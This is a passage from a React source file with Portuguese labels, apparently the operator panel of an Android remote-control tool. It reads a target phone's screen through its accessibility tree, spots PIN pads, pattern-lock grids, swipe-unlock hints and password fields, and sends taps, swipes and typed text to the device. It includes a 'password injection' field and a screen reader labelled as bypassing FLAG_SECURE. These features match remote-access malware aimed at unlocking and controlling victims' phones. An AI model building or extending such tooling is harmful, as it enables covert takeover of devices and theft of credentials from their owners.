                      onClick={() => sendCmd('TAP', { x: p.x, y: p.y })}>{pi+1}</button>
                  ))}
                </div>
              )}
            </div>
          )}

          {/* Quick unlock panels */}
          {pinDigits.length > 0 && (
            <div className="card card-sm mb6" style={{ border: '1px solid #60a5fa33' }}>
              <div className="txt-xs txt-dim mb5" style={{ color: '#60a5fa' }}>⌨ PIN</div>
              <div style={{ display: 'flex', gap: 5, flexWrap: 'wrap' }}>
                {pinDigits.map((nd, i) => (
                  <button key={i} className="btn btn-blue btn-sm" style={{ minWidth: 36, fontSize: 14, fontWeight: 800 }}
                    onClick={() => tapNode(nd)}>{nd.text}</button>
                ))}
              </div>
            </div>
          )}
          {patternNode && (
            <div className="card card-sm mb6" style={{ border: '1px solid #818cf833' }}>
              <div className="txt-xs txt-dim mb5" style={{ color: '#818cf8' }}>⊞ PATTERN</div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 5, maxWidth: 110 }}>
                {patternNode.patternGrid.map((p, pi) => (
                  <button key={pi} className="btn btn-ghost btn-sm" style={{ fontSize: 11, fontWeight: 700 }}
                    onClick={() => sendCmd('TAP', { x: p.x, y: p.y })}>{pi+1}</button>
                ))}
              </div>
            </div>
          )}
          {swipeNode && (
            <div className="card card-sm mb6" style={{ border: '1px solid #fbbf2433' }}>
              <div className="txt-xs txt-dim mb5" style={{ color: '#fbbf24' }}>👆 SWIPE UNLOCK</div>
              <button className="btn btn-gold btn-sm"
                onClick={() => { const h = swipeNode.swipeHint; if (h) sendCmd('SWIPE', { x1: h.sx, y1: h.sy, x2: h.ex, y2: h.ey, duration: 280 }); }}>
                ↑ EXECUTAR
              </button>
            </div>
          )}
          {pwFields.length > 0 && (
            <div className="card card-sm mb6" style={{ border: '1px solid #f8717133' }}>
              <div className="txt-xs txt-dim mb5" style={{ color: '#f87171' }}>🔒 CAMPO SENHA</div>
              <div className="input-row">
                <input id="ly-type-input" className="input" placeholder="Injetar senha..."
                  value={typeText} onChange={e => setTypeText(e.target.value)}
                  onKeyDown={e => { if (e.key === 'Enter') { tapNode(pwFields[0]); setTimeout(() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }, 120); } }} />
                <button className="btn btn-red btn-sm"
                  onClick={() => { tapNode(pwFields[0]); setTimeout(() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }, 120); }}>💉</button>
              </div>
            </div>
          )}
          <div style={{ height: 6 }} />
        </div>
      )}

      {/* ── Nav keys ── */}
      <div className="section-title mt2">Navegação</div>
      <div className="grid g4 mb8">
        {[['◀','BACK'],['⌂','HOME'],['⧉','RECENTS'],['⏻','POWER_MENU'],
          ['🔔','NOTIFICATIONS'],['⚙','QUICK_SETTINGS'],['💡','WAKEUP'],['🔒','LOCK_DEVICE']
        ].map(([icon, action]) => (
          <button key={action} className="btn btn-ghost btn-sm btn-block"
            onClick={() => sendCmd(action)}>{icon}</button>
        ))}
      </div>

      {/* ── Inject ── */}
      <div className="section-title">Injetar</div>
      <div className="card card-sm mb8">
        <div className="input-row mb6">
          <input className="input" placeholder="Texto..." value={typeText}
            onChange={e => setTypeText(e.target.value)}
            onKeyDown={e => { if (e.key === 'Enter') { sendCmd('TYPE', { text: typeText }); setTypeText(''); } }} />
          <button className="btn btn-gold btn-sm"
            onClick={() => { sendCmd('TYPE', { text: typeText }); setTypeText(''); }}>TYPE</button>
        </div>
        <div className="txt-xs txt-dim mb5">Coordenadas brutas (device px)</div>
        <div className="input-row">
          <input className="input" placeholder="X" type="number" value={tapX}
            onChange={e => setTapX(e.target.value)} style={{ width: 64 }} />
          <input className="input" placeholder="Y" type="number" value={tapY}
            onChange={e => setTapY(e.target.value)} style={{ width: 64 }} />
          <button className="btn btn-gold btn-sm" onClick={() => sendCmd('TAP', { x: +tapX, y: +tapY })}>TAP</button>
          <button className="btn btn-ghost btn-sm" onClick={() => sendCmd('LONG_PRESS', { x: +tapX, y: +tapY, duration: 800 })}>HOLD</button>
        </div>
      </div>

      {/* ══ V2 SCREEN READER ═════════════════════════════════════════════════ */}
      {showReader && (
        <div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 8,
            padding: '4px 10px', borderRadius: '7px 7px 0 0',
            background: 'rgba(6,4,14,.95)', border: '1px solid rgba(255,255,255,.07)', borderBottom: 'none' }}>
            <span style={{ fontSize: 10, fontWeight: 800, color: '#4ade80', letterSpacing: 1 }}>🔓 V2 FLAG_SECURE</span>
          </div>
          <div className="card card-sm" style={{ borderRadius: '0 0 7px 7px', marginBottom: 8 }}>
            <div className="row gap5 mb6" style={{ flexWrap: 'wrap' }}>
              <button className="btn btn-gold btn-sm"
                onClick={() => { sendCmd('REQUEST_HIERARCHY'); toast2('Aguardando...', '#fbbf24'); }}>🌳 HIERARCHY</button>
              <button className={`btn btn-sm ${liveMode ? 'btn-red' : 'btn-ghost'}`}
                onClick={() => setLiveMode(v => !v)}>{liveMode ? '⏹ LIVE' : '🔴 LIVE'}</button>
              <button className="btn btn-ghost btn-sm" onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: true })}>👁 ON</button>
              <button className="btn btn-ghost btn-sm" onClick={() => sendCmd('TOGGLE_SCREEN_READER', { enabled: false })}>⏹ OFF</button>
              <button className="btn btn-ghost btn-sm" onClick={() => { setNodes([]); setLines([]); setRawData(''); setLySelected(null); }}>🗑</button>
            </div>
            <div className="row gap5 mb6">
              {[['ocr','📄 OCR'],['nodes','🔵 NODES'],['raw','{ } RAW']].map(([id,lbl]) => (
                <button key={id} onClick={() => setSrTab(id)}
                  className={`btn btn-sm ${srTab===id ? 'btn-gold' : 'btn-ghost'}`}>{lbl}</button>
              ))}
              {srTs && <span className="txt-xs txt-dim" style={{ alignSelf:'center', marginLeft:'auto' }}>{new Date(srTs).toLocaleTimeString()}</span>}
            </div>
            {nodes.length > 0 && (
              <div className="row gap5 mb6">
                <span className="pill pill-green"  style={{ fontSize: 9 }}>{nodes.filter(n=>n.text).length} txt</span>
                <span className="pill pill-gold"   style={{ fontSize: 9 }}>{nodes.filter(n=>n.clickable).length} tap</span>
                <span className="pill pill-purple" style={{ fontSize: 9 }}>{nodes.filter(n=>n.isKeyboard).length} kbd</span>
                {nodes.filter(n=>n.password).length > 0 && <span className="pill pill-red" style={{ fontSize: 9 }}>🔒 {nodes.filter(n=>n.password).length}</span>}
              </div>
            )}

            {srTab === 'ocr' && (
              <div ref={ocrRef} style={{ maxHeight: 400, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 2 }}>
                {lines.length === 0 && (
                  <div className="no-data" style={{ padding: 32 }}>
                    <div style={{ fontSize: 30, marginBottom: 8 }}>🌳</div>
                    <div style={{ fontSize: 12 }}>Toque HIERARCHY</div>
                  </div>
                )}
                {lines.map((row, ri) => (
                  <div key={ri} style={{ display:'flex', gap:3, flexWrap:'wrap', padding:'3px 6px', borderRadius:5,
                    background: ri%2===0 ? 'rgba(212,149,10,.04)' : 'transparent' }}>
                    {row.map((nd, ni) => (
                      <button key={ni} onClick={() => tapNode(nd)}
                        style={{ background: nd.isPinDigit ? 'rgba(96,165,250,.15)' : nd.password ? 'rgba(248,113,113,.12)' :
                            nd.isKeyboard ? 'rgba(192,132,252,.12)' : nd.clickable ? 'rgba(251,191,36,.12)' : 'rgba(255,255,255,.04)',
                          border: `1px solid ${nd.isPinDigit ? '#60a5fa44' : nd.password ? '#f8717144' : nd.isKeyboard ? '#c084fc44' : nd.clickable ? '#fbbf2444' : '#ffffff11'}`,
                          borderRadius:4, padding:'3px 7px',
                          color: nd.isPinDigit ? '#60a5fa' : nd.password ? '#f87171' : nd.isKeyboard ? '#c084fc' : nd.clickable ? '#fbbf24' : 'var(--text2)',
                          fontSize:11, fontWeight: nd.clickable ? 700 : 400, cursor: nd.clickable ? 'pointer' : 'default',
                          fontFamily:'var(--font)', opacity: nd.enabled ? 1 : 0.5 }}
                        title={`[${nd.bounds?.left},${nd.bounds?.top}→${nd.bounds?.right},${nd.bounds?.bottom}]`}>
                        {nd.text}{nd.password && <span style={{ marginLeft:3, fontSize:9 }}>🔒</span>}{nd.checked && <span style={{ marginLeft:3, color:'#4ade80' }}>✓</span>}
                      </button>
                    ))}
                  </div>
                ))}
              </div>
            )}

            {srTab === 'nodes' && (
              <div>
                <div className="input-row mb5">
                  <input className="input" placeholder="Filtrar..." value={filter} onChange={e => setFilter(e.target.value)} />
                  <span className="txt-xs txt-dim" style={{ alignSelf:'center', whiteSpace:'nowrap' }}>{filteredNodes.length}/{nodes.length}</span>
                </div>
                <div style={{ maxHeight: 420, overflowY: 'auto' }}>
                  {filteredNodes.slice(0, 250).map((nd, i) => (
                    <div key={i} style={{ padding:'6px 8px', marginBottom:2, borderRadius:5,
                      background:'rgba(255,255,255,.02)', borderLeft:`2px solid ${nodeColor(nd)}`,
                      paddingLeft: 8 + nd.depth * 4, cursor: nd.clickable ? 'pointer' : 'default', opacity: nd.enabled ? 1 : 0.5 }}
                      onClick={() => nd.clickable && tapNode(nd)}>
                      <div className="row-sb">
                        <div style={{ flex:1, minWidth:0 }}>
                          {nd.text && <div style={{ fontWeight:600, fontSize:12, color:'var(--text)', marginBottom:1 }}>{nd.text}</div>}
                          <div style={{ fontSize:9, color:'var(--text3)', fontFamily:'var(--font-mono)', overflow:'hidden', textOverflow:'ellipsis', whiteSpace:'nowrap' }}>
                            {nd.cls.split('.').pop()}{nd.id && <span style={{ marginLeft:5 }}>#{nd.id.split('/').pop()}</span>}
                          </div>
                        </div>
                        <div style={{ display:'flex', gap:3, flexShrink:0 }}>
                          {nd.clickable    && <span style={{ fontSize:8, color:'#fbbf24', fontWeight:700 }}>TAP</span>}
                          {nd.scrollable   && <span style={{ fontSize:8, color:'#4ade80' }}>SCROLL</span>}
                          {nd.isPinDigit   && <span style={{ fontSize:8, color:'#60a5fa' }}>PIN</span>}
                          {nd.isKeyboard   && <span style={{ fontSize:8, color:'#c084fc' }}>⌨</span>}
                          {nd.isPatternLock && <span style={{ fontSize:8, color:'#818cf8' }}>⊞</span>}
                          {nd.password     && <span style={{ fontSize:8, color:'#f87171' }}>🔒</span>}
                          {nd.focused      && <span style={{ fontSize:8, color:'#f9fafb' }}>⊙</span>}
                        </div>
                      </div>
                      {nd.bounds && (
                        <div style={{ fontSize:8, color:'var(--text3)', fontFamily:'var(--font-mono)', marginTop:2 }}>
                          {nd.bounds.left},{nd.bounds.top}→{nd.bounds.right},{nd.bounds.bottom} ({nd.bounds.right-nd.bounds.left}×{nd.bounds.bottom-nd.bounds.top})
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            )}

            {srTab === 'raw' && (
              <div>
                <div className="row-sb mb5">
                  <span className="txt-xs txt-dim">{rawData.length} chars · {nodes.length} nós</span>
                  <button className="btn btn-ghost btn-xs" onClick={() => navigator.clipboard?.writeText(rawData).catch(()=>{})}>📋</button>
                </div>
                <div className="term" style={{ height:380, overflowY:'auto', whiteSpace:'pre', fontSize:9, lineHeight:1.5 }}>
                  {rawData || 'Nenhum dado.'}
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div style={{ height: 24 }} />
    </div>
  );
}
